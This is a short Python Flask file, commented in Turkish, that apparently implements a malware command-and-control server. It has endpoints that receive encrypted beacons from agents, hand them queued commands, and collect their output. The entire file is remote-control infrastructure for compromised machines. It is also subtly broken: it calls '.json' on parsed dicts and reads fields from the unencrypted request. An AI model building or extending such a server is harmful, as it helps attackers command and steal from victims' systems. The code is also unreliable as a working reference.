import json
from flask import Flask, request , jsonify
import Encryption
from Encryption import decrypt_data

app = Flask(__name__)

tasks = {}

@app.route('/api/status', methods = ['POST'])
def beacon():
    #json verisi şifreli geliyor
    encryped = request.json.get('data')
    decrypted_json= decrypt_data(encryped)
    beacon_info = json.loads(decrypted_json)

    agent_id = beacon_info.get('id')

    task = tasks.pop(agent_id,None)
    response = {"task":task} if task else {"task":None}

    # once python nesnesını jsona çevirdik sonra sifreledik.
    encrypted_response = Encryption.encrypt_data(json.dumps(response))
    return jsonify({"data":encrypted_response})

@app.route('/api/upload', methods= ['POST'])
def result():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    result_info = json.loads(decrypted_json)


    agent_id = result_info.json.get('id')
    output = request.json.get('output')
    print(f"[+] Result from {agent_id}: {output}")
    return jsonify({"status": "received"})

@app.route('/api/push', methods = ['POST'])
def task():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    task_info = json.loads(decrypted_json)

    agent_id = task_info.json.get('id')
    command=request.json.get('command')
    if agent_id not in tasks:
        tasks[agent_id]= []
    tasks[agent_id].append(command)
    return jsonify({"status":"task queued"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)